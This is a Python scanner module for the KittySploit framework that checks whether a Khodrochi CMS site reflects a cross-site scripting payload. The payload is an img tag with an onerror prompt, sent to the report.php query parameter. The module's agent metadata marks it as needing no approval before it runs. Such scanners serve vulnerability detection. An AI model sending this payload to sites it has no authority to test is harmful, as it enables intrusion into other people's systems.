#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross site scripting vulnerability was found in the Khodrochi."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Khodrochi CMS - Cross Site Scripting Detection',
        'description': 'A cross site scripting vulnerability was found in the Khodrochi.ir CMS an Iranian Car Services Platform.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'khodrochi', 'cms', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploitalert.com/view-details.html?id=38723',
            'https://cxsecurity.com/ascii/WLB-2022050087',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('><img src=x onerror=prompt(document.domain)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Khodrochi CMS - Cross Site Scripting detected",
                path='/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E',
            )
            return True
        return False

